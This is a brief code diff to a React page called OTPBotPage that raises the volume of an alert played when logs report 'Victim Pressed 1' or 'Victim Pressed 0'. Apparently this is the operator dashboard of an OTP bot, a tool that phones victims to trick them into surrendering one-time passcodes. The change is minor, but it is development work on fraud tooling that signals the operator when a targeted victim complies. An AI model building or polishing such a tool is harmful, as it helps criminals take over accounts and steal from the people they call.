@@ -136,7 +136,7 @@ const OTPBotPage = () => {
             // Play notification sound for Victim Pressed 1 or 0
             if (log.type === 'warning' && (log.message.includes('Victim Pressed 1') || log.message.includes('Victim Pressed 0'))) {
                 const audio = new Audio('/notification-sound.wav');
-                audio.volume = 0.7;
+                audio.volume = 1.0;
                 audio.play().catch(err => console.log('Audio play failed:', err));
             }
             
